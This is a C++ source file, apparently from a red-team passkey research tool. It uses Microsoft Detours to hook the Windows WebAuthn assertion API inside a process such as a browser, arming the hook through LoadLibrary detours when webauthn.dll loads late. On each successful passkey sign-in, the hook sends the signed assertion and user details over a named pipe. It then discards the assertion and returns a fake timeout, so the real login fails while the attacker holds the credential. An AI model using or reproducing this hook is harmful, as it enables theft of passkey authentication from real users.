#include "WebAuthnHook.h"

#include "Logging.h"
#include "NamedPipe.h"

#include <detours.h>

#include <string>

namespace SpecterOps::Passkeys::WebAuthnHook
{
    constexpr const wchar_t* WebAuthnModuleName = L"webauthn.dll";
    constexpr const char* GetAssertionExportName = "WebAuthNAuthenticatorGetAssertion";

    using WebAuthNAuthenticatorGetAssertionFn = HRESULT(WINAPI*)(
        HWND hwnd,
        LPCWSTR rpId,
        WEBAUTHN_CLIENT_DATA* clientData,
        WEBAUTHN_AUTHENTICATOR_GET_ASSERTION_OPTIONS* options,
        WEBAUTHN_ASSERTION** assertion);

    using LoadLibraryWFn = HMODULE(WINAPI*)(LPCWSTR fileName);
    using LoadLibraryExWFn = HMODULE(WINAPI*)(LPCWSTR fileName, HANDLE file, DWORD flags);

    // Original API entrypoints that Detours rewrites in place.
    WebAuthNAuthenticatorGetAssertionFn TrueWebAuthNAuthenticatorGetAssertion = nullptr;
    LoadLibraryWFn TrueLoadLibraryW = ::LoadLibraryW;
    LoadLibraryExWFn TrueLoadLibraryExW = ::LoadLibraryExW;

    // Guards against attaching the assertion detour more than once per process.
    volatile LONG g_assertionHookInstalled = 0;

    // Tracks whether the LoadLibrary bootstrap detours were installed, so detach
    // skips them when the assertion hook was armed directly at DLL attach.
    volatile LONG g_bootstrapHooksInstalled = 0;

    HRESULT WINAPI HookWebAuthNAuthenticatorGetAssertion(
        HWND hwnd,
        LPCWSTR rpId,
        WEBAUTHN_CLIENT_DATA* clientData,
        WEBAUTHN_AUTHENTICATOR_GET_ASSERTION_OPTIONS* options,
        WEBAUTHN_ASSERTION** assertion)
    {
        AppendLog(FormatAssertionRequest(hwnd, rpId, clientData, options));

        // Retrieve process context once so all pipe messages share the same values
        // without repeating the OS lookups.
        const std::wstring processName = GetCurrentProcessName();
        const std::wstring userName    = GetCurrentUserName();
        const DWORD        pid         = ::GetCurrentProcessId();

        // Open the pipe before calling the real API so the "started" message arrives
        // before the user is prompted.  A missing listener is silently ignored.
        const HANDLE pipe = OpenHookPipe();
        const bool pipeOpen = pipe != INVALID_HANDLE_VALUE;

        if (pipeOpen)
        {
            WritePipeMessage(pipe, BuildAssertionStartedMessage(rpId, processName, userName, pid));
        }

        const HRESULT result = TrueWebAuthNAuthenticatorGetAssertion(hwnd, rpId, clientData, options, assertion);

        if (pipeOpen)
        {
            if (SUCCEEDED(result) && assertion != nullptr && *assertion != nullptr)
            {
                const std::string msg = BuildAssertionCompletedMessage(processName, userName, pid, clientData, *assertion);
                WritePipeMessage(pipe, msg);

                ::FlushFileBuffers(pipe);
                ::CloseHandle(pipe);
                ::WebAuthNFreeAssertion(*assertion);
                *assertion = nullptr;
                return HRESULT_FROM_WIN32(ERROR_TIMEOUT);
            }
            else
            {
                WritePipeMessage(pipe, BuildAssertionErrorMessage(rpId, processName, userName, pid, result));
            }

            ::FlushFileBuffers(pipe);
            ::CloseHandle(pipe);
        }

        return result;
    }

    HMODULE WINAPI HookLoadLibraryW(LPCWSTR fileName)
    {
        const HMODULE module = TrueLoadLibraryW(fileName);
        AttachAssertionHook();
        return module;
    }

    HMODULE WINAPI HookLoadLibraryExW(LPCWSTR fileName, HANDLE file, DWORD flags)
    {
        const HMODULE module = TrueLoadLibraryExW(fileName, file, flags);
        AttachAssertionHook();
        return module;
    }

    // Browsers often load webauthn.dll lazily, so installation is retried after
    // DLL load events until the target export becomes available.
    bool AttachAssertionHook()
    {
        if (::InterlockedCompareExchange(&g_assertionHookInstalled, 1, 0) != 0)
        {
            return true;
        }

        const HMODULE webAuthnModule = ::GetModuleHandleW(WebAuthnModuleName);
        if (webAuthnModule == nullptr)
        {
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
            return false;
        }

        const auto target = reinterpret_cast<WebAuthNAuthenticatorGetAssertionFn>(
            ::GetProcAddress(webAuthnModule, GetAssertionExportName));
        if (target == nullptr)
        {
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
            return false;
        }

        TrueWebAuthNAuthenticatorGetAssertion = target;

        if (DetourTransactionBegin() != NO_ERROR)
        {
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
            return false;
        }

        DetourUpdateThread(::GetCurrentThread());
        const LONG attachResult = DetourAttach(
            reinterpret_cast<PVOID*>(&TrueWebAuthNAuthenticatorGetAssertion),
            HookWebAuthNAuthenticatorGetAssertion);

        const LONG commitResult = DetourTransactionCommit();
        if (attachResult != NO_ERROR || commitResult != NO_ERROR)
        {
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
            return false;
        }

        AppendLog(
            L"[" + Timestamp() + L"] " + GetCurrentProcessName()
            + L" (pid " + std::to_wstring(::GetCurrentProcessId())
            + L", user " + GetCurrentUserName()
            + L") WebAuthN Detours hook armed.");
        return true;
    }

    // Bootstrap by watching later LoadLibrary calls in case webauthn.dll is not
    // present when the detour DLL first attaches.
    bool AttachBootstrapHooks()
    {
        if (DetourTransactionBegin() != NO_ERROR)
        {
            return false;
        }

        DetourUpdateThread(::GetCurrentThread());
        const LONG loadLibraryResult = DetourAttach(reinterpret_cast<PVOID*>(&TrueLoadLibraryW), HookLoadLibraryW);
        const LONG loadLibraryExResult = DetourAttach(reinterpret_cast<PVOID*>(&TrueLoadLibraryExW), HookLoadLibraryExW);
        const LONG commitResult = DetourTransactionCommit();

        const bool success = loadLibraryResult == NO_ERROR
            && loadLibraryExResult == NO_ERROR
            && commitResult == NO_ERROR;

        if (success)
        {
            ::InterlockedExchange(&g_bootstrapHooksInstalled, 1);
        }

        return success;
    }

    void DetachHooks()
    {
        if (DetourTransactionBegin() != NO_ERROR)
        {
            return;
        }

        DetourUpdateThread(::GetCurrentThread());

        if (::InterlockedCompareExchange(&g_assertionHookInstalled, 0, 1) == 1 && TrueWebAuthNAuthenticatorGetAssertion != nullptr)
        {
            DetourDetach(
                reinterpret_cast<PVOID*>(&TrueWebAuthNAuthenticatorGetAssertion),
                HookWebAuthNAuthenticatorGetAssertion);
        }

        if (::InterlockedCompareExchange(&g_bootstrapHooksInstalled, 0, 1) == 1)
        {
            DetourDetach(reinterpret_cast<PVOID*>(&TrueLoadLibraryW), HookLoadLibraryW);
            DetourDetach(reinterpret_cast<PVOID*>(&TrueLoadLibraryExW), HookLoadLibraryExW);
        }

        DetourTransactionCommit();
    }
}
